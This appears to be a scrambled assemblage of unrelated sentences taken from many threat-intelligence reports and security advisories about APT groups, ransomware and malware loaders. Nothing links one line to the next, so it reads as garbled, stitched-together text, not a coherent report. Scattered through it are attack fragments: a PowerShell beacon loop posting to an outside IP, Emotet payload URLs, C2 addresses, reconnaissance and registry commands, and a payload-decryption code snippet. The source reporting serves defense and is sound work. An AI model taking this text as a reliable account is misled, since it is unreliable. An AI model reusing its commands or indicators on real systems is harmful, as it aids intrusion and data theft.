It downloads malicious payload including AgentTesla, Azorult and Ramcos RAT etc.
The second shellcode makes exe inject the Trojan loader back into winlogon.exe. 
In addition to the above cluster, we detected two servers related to Microcin’s activity on the same network: Domain IP ASN m.necemarket[.]com 172.105.94[.]67 AS63949 – LINODE holdmem.dbhubspi[.]com 5.188.93[.]132 AS202422 – G-Core Labs Who is behind the MoonBounce attack? 
Next, the script writes the extracted email addresses from the array to a file called “.Outlook” created by the script in the roaming user profile’s
FlowCloud deployment process First, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format.
This vulnerability enables a malicious cyber actor to log in without a prompt for the user’s second authentication factor (FortiToken) when the actor changes the case of the username. 
Defensive Architecture Overview Today’s digital enterprise is a hybrid environment of on-premise systems and cloud services with multiple entry points for attacks like NetWalker.
Figure 8.
[Registry Run Key - reg.exe] (T1547.001) WINDOWS METHODOLOGY
Scan for and remove suspicious email attachments; ensure any scanned attachment is its "true file type" (i.e., the extension matches the file header). 
Subsequently, the loader encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.
Disable or Modify Tools Description Disabling Windows Defender notifications, Task Manager and Command Prompt MITRE ATT&CK Tactic Process Injection ID T1055 Description ISFB injects itself into explorer.exe as a result of successful BatLoader infection MITRE ATT&CK Tactic Unsecured Credentials ID T1552.001 MITRE ATT&CK Technique Unsecured Credentials: Credentials In Files Description The ISFB version observed is capable of accessing browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords. 
A management of expertise.
GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft. 
The directory contains a few files whose names are associated with Adobe Acrobat Reader DC.
DNS spike for test[.]softlemon[.]net queries vs dates. 
It would read the encrypted payload (“nkford.nlp” is the payload in this case) then decrypt it and run it in the memory.
Pivoting on part of the script’s content in VirusTotal Intelligence One example of such reporting is our July 2022 post on 8220 Gang expanding their botnet to roughly 30,000 hosts.
[T1204] of malicious files [T1204.002] and links
To generate the jar a simple way without needing a manifest is thew following javac .\HelloWorld.java jar cfe app.jar HelloWorld HelloWorld.class PoC By chaining all together, we get a nice simple flow here. 
mshta You can also run for example hta files from that WebDAV.
The list of IOCs can be downloaded here. 
APT41 backdoors, old and new url: https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/ The PT Expert Security Center regularly spots emerging threats to information security, including both previously known and newly discovered malware.
Depending on it, the script extracts either the 32-bit or the 64-bit second stage installer to the /tmp/udev2 file and launches it.
Watch.targets"
:**** coop!main+0x3d2 0:001> u 00000001`4001847e L1 coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr
[SD2] After the connection to the internet and shared domains were severed, automated processes continued to propagate malware. 
The latter is launched with a command line URL executing the content. 
[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\<Redacted>]
==
Although the original developer already stopped maintenance and removed the download link, it’s still getting more popular in the recent cyber-attack.
The data stored in the BSS section is encoded as shown in Figure 19. Figure 19: Snipped of the encoded data in the BSS section 
During our investigation, we noticed two methods of spreading the malware.
We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.
The RSA-encrypted AES key and IV will be appended on each encrypted file (Figure 10). 
[TA0002] Table IV: Chinese state-sponsored cyber actors’ Execution TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Command and Scripting Interpreter
| | 108.62.118.247 | /as 
They then dispatch an asynchronous procedure call (APC) to the APC queue of a target process thread using NtQueueApcThread, forcing the target process to call GlobalGetAtomA. 
.jsp .key .keychain .log .lua 
This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes. Figure 15.
On (SSO) functionality, which require the user’s credentials to be stored in memory, thereby allowing the OS to seamlessly access network resource without repeatedly asking the user to re-enter those credentials.
Technical Details Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11.
Threat actors initiate this attack by sending numerous DNS requests to the open DNS server using the target IP address as the source address.
GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run. 
The malware then decrypts the received payload using AES and the shared key. 
In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.
The dropper (versions.dll) drops the payload (oci.dll) into the System32 directory. 
In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence.
AppendicesMITRE ATT&CK MappingReconnaissance:• T1598 ­– Phishing for InformationCredential Access:• T1110 – Brute ForceInitial Access:• T1078.004 – Valid Accounts: Cloud AccountsCommand and Control:• T1105 ­– Ingress Tool TransferPersistence:• T1098.003 – Account Manipulation: Additional Cloud Roles Collection:• T1114 – Email Collection Defense Evasion:• T1564.008 ­– Hide Artifacts: Email Hiding Rules­Lateral Movement:• T1534 – Internal SpearphishingUnusual Source IPs•
We also found the operations having specific geographical regions for which they tailored their collection requirements. 
These personal devices introduce inherent risk because they may interact with personal files via cloud services. 
Further, as IronPython is written in C# and thus its process contains all the Common Language Runtime (CLR) on execution, one can easily load additional assemblies. 
ESET researchers have documented and analyzed TA410 activity going back to 2019.
Implement an antivirus program and a formalized patch management process. 
Security Solution Evasion Rorschach spawns processes in an uncommon way, running them in SUSPEND mode and giving out falsified arguments to harden analysis and remediation efforts.
Second Stage – Stealing Credit Card Data Once the attacker convinces the victim about the allegedly suspended package, they try to steal the victim’s credit card number on a different page. 
title: How to Detect Cobalt Strike url: https://www.intezer.com/blog/malware-analysis/cobalt-strike-detect-this-persistent-threat/ Cobalt Strike is a penetration testing tool created by Raphael Mudge in 2012.
This module uses the same communication protocol that is used in the main Trojan component: 
Mitigation: Do not leave RDP accessible from the internet.
This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines. 
In these attacks, adversaries attempt to exfiltrate large quantities of sensitive information for the purposes of further extortion against victims.
StealthVector gets loaded through the introduction of a modified benign system DLL, in which the import address table is patched to append the malware’s DLL as a dependency.
Right - the DLL loading code The Shellcode's Loader DLL 
flags=0x20002(adhoc,linker-signed) hashes=100+0 location=embedded Signature=adhoc Info.plist=not bound TeamIdentifier=not set Sealed Resources=none Internal requirements=none % spctl -a -vvv
For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.
This is observed below by comparing the file hashes for "tox5.exe" and "C:\ProgramData\lplshr\basinqt.exe." 
Another indicator in the process dump was the setup of the C2 connection including the User-Agent that has been observed being used by Winnti 4.0 malware: 
Some key features of the AsyncSSH library include: Asynchronous Execution: AsyncSSH is built with asynchronous programming in mind, allowing you to perform SSH operations concurrently without blocking the execution flow. 
In TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation.
But how simple is it to calculate? 
In other cases, the team attempted to determine valid accounts based on group name and purpose.
The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.
The message above the ‘Open’ button instructs the user to “double click” in order to receive the attachment. 
https[:]//lopespublicidade[.]com/cgi-bin/e5R5oG4iEaQnxQrZDh/ https[:]//bosny[.]com/aspnet_client/rnMp0ofR/ http[:]//seasidesolutions[.]com/cgi-bin/WLoO6sEzYCJ3LTlC/ http[:]//borgelin[.]org/belzebub/okwRWz1C/ http[:]//loa-hk[.]com/wp-content/ffBag/ The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed. 
Near the end of this article all the tactics and techniques used by the adversary are listed with links to the MITRE website with more information. 
The first suspected subset of activity revealed Korean-language lure documents.
Threat researchers reported similar campaigns in the past targeting Mexico. 
Load each function and update its address. 
Consequently, any process running in the context of the logged in user will be able to decrypt the credentials using CryptUnProtectData DPAPI.
Microsoft Defender for Cloud Apps Activity from suspicious IP addresses.
1.1 Attribution These attacks have been studied in detail by Malwarebytes and Zscaler.
You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. 
%%i in (workers.txt) do for /f "tokens=2 delims=[]"
We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts. 
CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures.
Among these, “View2015” and “View2016” were empty. 
title: Defending Users’ NAS Devices From Evolving Threats url: https://www.trendmicro.com/en_us/research/22/a/defending-users-NAS-devices-from-evolving-threats.html Defending Users’ NAS Devices From Evolving Threats In our latest research, we analyze the threats targeting well-known brands of network-attached storage (NAS) devices. 
All that is left is to execute the backdoor.
All communications over I2P are anonymous and end-to-end encrypted, and users of the network don’t reveal their real IP addresses.
Monitor for command-line deletion functions to correlate with binaries or other files that an adversary may create and later remove.
LoadAssembly: Load .NET assembly passed as a parameter. 
Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“.
The script is executed as a command line argument passed into a /bin/sh -c
We have notified the affected victim of this intrusion but received no feedback. 
Below are all the command lines run by the adversaries: Lateral Movement Lateral Tool Transfer Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server: The threat actors also transferred ProcDump from the beachhead to multiple workstations: Remote Services Remote Desktop Protocol Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server: Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account: This first lateral movement was performed in order to drop and install AnyDesk. 
Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism.
It doesn’t prevent the plugin from working since it only tries to load it if the file actually exists.
The correlations between TeamTNT and WatchDog are intrinsically connected with this b.sh script. 
Mimikatz CISA has observed the actors using Mimikatz during their operations.
a counter of MFT records that are encrypted Causes a disk reboot Upon a second reboot, the NotPetya ransomware note is displayed as shown below: 
Simply put, ransomware’s actions provide us with a powerful detection heuristic. 
Palo Alto Networks detects and prevents BlackCat ransomware with the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire). 
0x14 File body bytes. 
The courses of action below mitigate the following techniques: Remote Access Software [T1219] NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure that access to every URL is logged CORTEX XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Exfiltration 
[D3-FAPA] Signed Binary Proxy Execution
Investigation with a twist an accidental APT attack and averted data destruction
Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI service The table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation. 
The affiliate page includes instructions for customizing the ransomware executables, such as specifying the ransomware name, ransomware key name, comment, price or ransom amount, and timer type (None, double, or leak). 
Mitigation and Prevention Strategies One of the main initial access vector is exploitation of publicly exposed web services.
Figure 24.
title: New RapperBot Campaign – We Know What You Bruting for this Time url: https://www.fortinet.com/blog/threat-research/new-rapperbot-campaign-ddos-attacks After FortiGuard Labs reported on RapperBot in our previous article titled So RapperBot, What Ya Bruting For? in August 2022, there was a significant drop in the number of samples collected in the wild.
We learned more about the packet structure of Winnti from this link. 
These information sources have legitimate uses for network defense.
The install completed with the following command. 
woff/<random components>-webfont<random component>.woff2 or fonts/woff/<random components>.woff2, where the <random components> can be numbers and one or more of the following strings: “Bold” “BoldItalic” “ExtraBold” “ExtraBoldItalic” “Italic”, “Light” “LightItalic” “Regular” “SemiBold” “SemiBoldItalic” “opensans” “noto” “freefont” “SourceCodePro” “SourceSerifPro” “SourceHanSans” “SourceHanSerif” swip/upd/<random components>, where <random components> can be one or more of the following strings: “SolarWinds” “.CortexPlugin” “.Orion” “Wireless” “UI” “Widgets” “NPM” “Apollo” “CloudMonitoring” “Nodes”, “Volumes”, “Interfaces”, “Components” swip/Upload.ashx swip/Events Here are examples of final URLs generated by the backdoor: hxxps://3mu76044hgf7shjf[.]appsync-api[.]eu-west-1[.]avsvmcloud[.]com /swip/upd/Orion[.]Wireless[.]xml hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-2[.]avsvmcloud[.]com /pki/crl/492-ca[.]crl hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-1[.]avsvmcloud[.]com /fonts/woff/6047-freefont-ExtraBold[.]woff2 Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.
Revisiting the NSISbased crypter
Monitor for modification of accounts in correlation with other suspicious activity [DS0002]. 
Infected Linux device connected to a C&C server How to protect NAS devices Without proper security implemented in NAS devices, users and businesses will continue to be targeted since these tools can be used as entry points for information theft, malware infection, and the disruption of operations, among others.
Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0); $url="http://103.159.132.91:8081/"; $postParams = 'result=start'; while (1 -eq 1) { try { $data =
Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin 
T1622.
title: Hungry for data, ModPipe backdoor hits POS software used in hospitality sector url: https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ Backdoor authors show deep knowledge of the targeted POS software, decrypting database passwords from Windows registry values ESET researchers have discovered ModPipe, a modular backdoor that gives its operators access to sensitive information stored in devices running ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS – a management software suite used by hundreds of thousands of bars, restaurants, hotels and other hospitality establishments worldwide. 
Figure 10.
The shellcode will obtain a handle to kernel32.LoadLibraryA, kernel32.GetProcAddress, kernel32.VirtualAlloc, kernel32.VirtualProtect and ntdll.
To remain stealthier, these activities would span a period ranging from many weeks to months. 
Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017]. 
It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. Figure 6.
Loader MD5 C&C Address Compilation Timestamp 0603C8AAECBDC523CBD3495E93AFB20C 92.38.178[.]246 Tuesday, 23.03.2021 08:00:44 UTC ns.glbaitech[.]com 8C7598061D1E8741B8389A80BFD8B8F5 
See KB87073 for details. 
Instead use more modern federation protocols (SAML, OIDC) or Kerberos for authentication with AES-256 bit encryption [CPG 3.4]. 
Further actions are performed with the help of an extracted JS script. 
It is important that defenders be aware of the various TTPs being used throughout the attack lifecycle so that they are prepared to prevent, detect, and respond to nefarious activity that may be indicative of a successful compromise of their environment.
d /x \\<hostname>\<fileshare>File and directory discoverycacl <path to file>Network service scanningget -b <start ip> -e <end ip> -pNetwork service scanningget -b <start ip> -e <end ip>Network share discoverynet shareNetwork share discoverynet view \\<hostname>Permission groups discoverynet localgroup administratorsProcess discoverytasklist /v
The first 16 bytes need to be interpreted as GUID value {7B5C52E4-D88C-4DA7-AEB1-5378D02996D3}.
We cover topics such as domain fronting, SOCKS proxy, C2 traffic, Sigma rules, JARM, JA3/S, RITA & more. 
ADfind: 
\\<host>\<path>\Cookies\*ctx*Remote system discoveryreg query \\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\ServersRemote system discoverydir /o:
These scripts will be published to GitHub in the coming days. 
One distinguishing trait of the group's backdoors is support for multiple transport protocols for connecting to C2 servers, which complicates efforts to detect malicious traffic.
We decided to call this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive. 
T1016
In August 2022, just two months after the group launched its Fargo variant, Mallox created a Twitter account where it could announce its victims.
1
Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.
In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours.
mixcinc[.]com BazarLoader C2 Domain (Employment Termination Malspam) 
;T1070.001 Indicator Removal on Host: Clear Windows Event Logs;By using wevtutil, BlackCat can clear all Windows event logs on a compromised host. ;
The actors’ heightened interest in Myanmar entities and successful attacks carried out against them were previously discussed thoroughly.
Figure 1 Using the URLhaus dataset, we can also learn that RedLine Stealer abuses several known legitimate file/code sharing and collaboration platforms for its campaigns.
C&C traffic of the PUBLOAD HTTP variant Once the payload is received, it will check if the first three magic bytes are 17 03 03 and if the following two bytes are the size of payload.
Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from server associated with .
T1608.001Stage Capabilities: Upload MalwareThe attackers uploaded their malicious MSI files to Alibaba Cloud Object Storage Service. 
IoCs The following IoC list is not complete.
These messages contained Microsoft OneNote attachments (.one).
Figure 3.
Recommendations from eSentire's Threat Response Unit (TRU) We recommend implementing the following controls to help secure your organization against BatLoader malware: Confirm that all devices are protected with Endpoint Detection and Response (EDR) solutions Encouraging good cybersecurity hygiene among your users by using Phishing and Security Awareness Training (PSAT) when downloading software from the Internet.
The ransomware builder interface allows affiliates to configure various settings for building the ransomware executables.
This assessment is based on several factors: all victims were customers of the affected software developer; the Fantasy wiper was named in a similar fashion to legitimate versions of the software; all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and, lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\Windows\Temp, the default temp directory for Windows systems. 
ITG10 Likely Targeting South Korean Entities of Interest to the Democratic Peoples Republic of Korea DPRK
The borg[.]wtf domain was linked to TeamTNT via a previous Unit 42 report.
Comparison of source code results Figure 29 shows the results of a source code similarity analysis led on the different variants of ransomware named in the figure itself.
/tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr
This just opens up new possibilities for evading detection, when using Python to develop malware. 
Black Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged.
T1567 Exfiltration over Web Service Gathered information was stored as ‘rar’ files on the internet-facing server, whereafter they were downloaded by a specific ip range. 
Of course, some groups (such as Lazarus and Winnti) combine cyberspying with direct financial motivations, so perhaps APT27 is broadening its previously limited range of interests.
The data is effectively stored in the first container file for the registry transaction log: C:\Users\Default\NTUSER.DAT<GUID>.TMContainer00000000000000000001.regtrans-ms. 
The main idea behind this technique is counterfeiting – that is crafting new objects in-memory from attacker-controlled payloads and to chain them together through virtual functions that are already present in the target application or in loaded libraries. 
Overall, we believe that Earth Preta is a capable and organized threat actor that is continuously honing its TTPs, strengthening its development capabilities, and building a versatile arsenal of tools and malware. 
Iterating over based_ch, which consists of a list of Chromium-based browser names.
https://nvd.nist.gov/vuln/detail/CVE-2020-2551 (accessed Apr. 28, 2023). 
Loading the Funny.
Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.
Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques. 
reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t
This is as shown below for example user “DCPrivUser”. 
As noted before, Rorschach’s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.
The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server. 
While cyber threat actors’ motivations and intents are often unknown, they often make their selections based on the target network’s security posture.
Figure 2.
Get updates from Palo Alto Networks! 
Figure 31: Embedded build name of the DLL Loader. 
Once that was accomplished, the suspicious and malicious functionality was easy to see. 
Browsers targeted by LummaC2: Chrome, Chromium, Mozilla Firefox, Microsoft Edge, Brave, Kometa, Opera GX Stable, Opera Neon, Opera Stable, Vivaldi, and others.
The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.
0x11A198F : combase_CoCreateGuid 0xE94A809 : kernel32_RtlZeroMemory 0x6A6A154 : kernel32_lstrcatA 0x8150471 : ntdll_RtlAllocateHeap 0x4CF4539 : user32_wvsprintfW 0x663555F : kernel32_WideCharToMultiByte 0x59CADCE :
T1328 Buy Domain Name CISA has observed the use of domains purchased by the threat actors. 
Figure 5: A timestamp mechanism in the code Looking at this, we can see a while loop that calls the check_timestamp function and receives a 64-bit integer value from GetSystemTimeAsFileTime Api call.
Figure 20.
We track this particular group as Earth Zhulong.
According to research and further changes on the JAVA TLS version as mentioned below, the JARM fingerprint that corresponds to a default configuration of the Cobalt Strike is: 07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2 Cobalt Strike is dependent on Java to run both the client graphical user interface (GUI) and the team server.
17 Returns OSVERSIONINFOEXW and SYSTEM_INFO structures. 
[T1053.005] Account Manipulation:
This vulnerability is in all operating systems (macOS, Windows, and Linux), and have yet to see a patch. 
DelphiTrojanBanking-10003087-0Win.
NSIS installers The dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System).
PrintNightmare DLL:
The ScrambleCross malware itself, which has been reported in use with both Earth Baku and SparklingGoblin, is considered a variant of CROSSWALK, a piece of malware that was described originally by Mandiant as an APT41 tool and remains distinct to the group, to the best of our knowledge. 
Document with encoded
Case Summary Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.
BITS Jobs Uses BITSAdmin to download and install payloads. 
WpnUserService 20400 rundll32.exe C:\Windows\System32\rundll32.exe Indicator Removal on Host: File Deletion 
In collaboration with NK News, a leading subscription-based service that provides news and analyses about North Korea, SentinelLabs has been tracking a targeted social engineering campaign against experts in North Korean affairs from the non-government sector.
As of March 30, the company was recommending that customers uninstall and reinstall the app, and suggested that they might also use the company’s browser-based PWA client while the situation was sorted out. 
Figure 5.
Anti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows. 
Dynamic analysis can open up new areas to explore as one can follow the malware through each stage of its deployment and functionality.
Start your free trial of Falcon Prevent today. 
The group announced that they would not target healthcare facilities, social services, educational institutions, charitable organizations and other organizations that “contribute to the survival of the human race”.
Our research links TZW ransomware to a known malware family called GlobeImposter (sometimes referred to as LOLNEK or LOLKEK).
/C
It executes WSReset.exe to trigger this protocol. 
Looking for the default Cobalt Strike TLS certificate. 
This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.
Detecting post-exploitation activity Alerts with the following titles may indicate post-exploitation threat activity related to MERCURY activity described in this blog and should be immediately investigated and remediated.
This attachment (unless zipped) is the MyDoom executable. 
Figure 7 shows the “on disk” representation of the FileDataStoreObject This is taken from a malicious OneNote document used to spread the Qakbot payload.
Contact law enforcement or CISA immediately regarding any unauthorized network access identified. 
https://nvd.nist.gov/vuln/detail/CVE-2021-44228 (accessed Apr. 28, 2023). 
RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office.
Review network signatures and indicators for focused activities, monitor for new phishing themes, and adjust email rules accordingly.
Its modified version will first call the original NtTestAlert function and then invoke the ProcessWorm reflective loader. 
Data Exfiltration From what we observed
For example, state-sponsored threat actors have demonstrated ongoing interest in targeting entities with policy research, military and government files, intellectual property, and personally identifiable information.
EclecticIQ researchers observed that the threat actor used the Windows command-line arguments to perform general reconnaissance against infected devices.
Hide Artifacts: Hidden Window T1036 – Masquerading T1112 – Modify Registry T1406.002 – Obfuscated Files or Information: Software Packing T1049 – System Network Connections Discovery T1083 – File and Directory Discovery T1057 – Process Discovery T1012 – Query Registry T1571 – Non-Standard Port 
Based on log and meta data found on the server, EclecticIQ analysts assess with high confidence the threat actor performed offensive cyber operations, including reconnaissance, malware delivery, and post-exploitation against selected targets.
Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
Figure 1.
Table 3.
These were both hosted on the same server IP: 212.73.150.62. 
With many other event management solutions with SIEMs, used in conjunction with other network security solutions, it becomes a challenge for administrators to distinguish malicious use of legitimate tools and services from lateral movement.
Figure 9 – Renaming of encrypted file using NtSetInformationFile. 
The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command. 
If the path exists, the next function of this malware is to check for the user config to steal the credentials.
South Korean Government, Communications and Educational Centers 
Congressional Research Service Cobalt Illusion Masquerades as Atlantic Council Employee.
Although Pulse Secure released patches for CVE-2019-11510 in April 2019, CISA observed incidents where compromised Active Directory credentials were used months after the victim organization patched their VPN appliance.[9] CVE-2020-0688: Microsoft Exchange Server CISA has observed the actors exploiting CVE-2020-0688 for remote code execution to enable email collection of targeted networks. 
Defense Block WebDAV communication Use Application restrictions like AppLocker or WDAC Monitor for the process java.exe spawning further binaries Conclusion This is not really a full chain attack for initial access at an RedTeam assessment
Contents of TaxReturns2022.iso Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. 
title: GuLoader VBScript Variant Returns with PowerShell Updates url: https://www.esentire.com/blog/guloader-vbscript-variant-returns-with-powershell-updates Adversaries don’t work 9-5 and neither do we.
Starting from the offset 0x100, the logging strings are encrypted with a single byte in XOR operations as shown Figure 33. 
Additionally, both use “in-memory virtual file systems” and utilize Lua to load plugins and modules. Comparison between Rhandamanthys’s “prepare.bin” and Hidden Bee’s “preload” modules CUEMiner: distribution through BitTorrent and OneDrive In August 2021, a project was started on GitHub called SilentCryptoMiner, hosting the miner consisting of a downloader and the payload, bot source and the compiled builder, as well as additional software, such as a system watcher.
As mentioned in the arrival vectors section, the next stage payloads are normally embedded in the fake document files. 
When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API. 
Today, however, attackers have more tools at their disposal.
key[j % size]; data[j] ^= key_stream[v4 + 256]; } } view raw nsis_decrypt.cpp hosted with :red_heart: by GitHub 
b. Register a new service that will run its VBS script (4.1) using sc.exe. 
LummaC2 is the name of a malicious program classified as a stealer.
The public release of Gh0st RAT source code made it easy for threat actors to obtain and tailor the tool to their needs.
Available: https://github.com/zan8in/afrog (accessed: Apr. 28, 2023). 
In order to make them directly, the authors of the malware switch to the 64-bit mode first: using a technique called “Heaven’s Gate”. 
Following this, the malware begins to beacon out to hard coded C2 servers.
Linking WatchDog Infrastructure to TeamTNT The URL addresses and Monero wallet address, 87A5fSCR98nFSR9NCRxt6UFytca3hJXaRdDgf9NxhWTjT3q3AA8HECyZ1FdF93D5LPXsSqS8dKNsxCxafrbuVeZfMW3V7ib, specifically called out within the sample 36bf7b2ab7968880ccc696927c03167b6056e73043fd97a33d2468383a5bafce (see Figure 9), are known WatchDog indicators.
The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection. 
The group is not very sophisticated; however, it is a highly persistent threat actor that continuously adapts its operational strategy.
[2].
This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
The below courses of action mitigate the following techniques: Spear Phishing Attachment [T1566.001] THREAT PREVENTION Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure a secure antivirus profile is applied to all relevant security policies NEXT-GENERATION FIREWALLS Set up File Blocking CORTEX XDR PREVENT Configure Malware Security Profile CORTEX XSOAR Deploy XSOAR Playbook – Endpoint Malware Investigation Deploy XSOAR Playbook – Phishing Investigation –
Thus, multiplying the point G by a scalar a produces the same result as multiplying G by a + k ⋅ r, for any value of k, since\n(a + k ⋅ r) ⋅ G = a ⋅ G + k ⋅ r ⋅ G = a ⋅ G + k ⋅ 0 = a ⋅ G\nThe example below illustrates how hashing messages larger than the expected size may lead to collisions.\n
cmd ani adv msi msp com nls ocx mpa cpl mod hta prf rtp rdp bin shs wpx bat rom msc spl ics key exe dll ... restore-my-files.txt ... winmd ntldr ntuser.dat.log bootsect.bak autorun.inf thumbs.db iconcache.db Also interesting are the strings related to Windows artifacts (e.g. autorun.inf, ntuser.dat.log, etc…).
On the webserver, software was installed to maintain the presence and storage of tools [T1105] that would be used to gather information about the victim’s network [T1083] and lateral movement/execution of files [T1570] [T1569.002].
The NoEscape ransomware excludes the below file extensions and folder names from encryption. 
Even though it’s only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.
By doing this, each infected device and the remote attacker’s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device. 
This function is responsible for adjusting the resource limits of the running process.
Interestingly enough, we opened an investigation into a case linked to that DLL on March 21, about a week before the supply chain attack was discovered.
Figure 11: The shellcode bytes inside the XML file The executable .text section’s characteristics are configured to RWE (Read-Write-Execute) -- that way the actor doesn't need to use VirtualAlloc or VirtualProtect in order to copy the shellcode and transfer the execution.
title: Malicious OAuth applications used to compromise email servers and spread spam - Microsoft Security Blog url: http://www.microsoft.com/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/ Microsoft researchers recently investigated an attack where malicious OAuth applications were deployed on compromised cloud tenants and then used to control Exchange servers and spread spam.
We have found that this attempt to deliver the LokiBot malware has strong ties to a BEC campaign.
